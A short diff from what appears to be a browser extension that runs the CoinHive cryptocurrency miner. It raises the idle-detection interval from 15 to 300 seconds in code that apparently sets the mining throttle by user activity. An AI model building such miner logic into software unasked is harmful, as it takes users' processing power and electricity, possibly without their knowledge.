@@ -142,7 +142,7 @@ if (CoinHive) {
   }
 
   if (chrome.idle && typeof chrome.idle.queryState === 'function') {
-    chrome.idle.setDetectionInterval(15);
+    chrome.idle.setDetectionInterval(300);
 
     chrome.idle.onStateChanged.addListener((newState) => {
       // Set appropriate throttle level
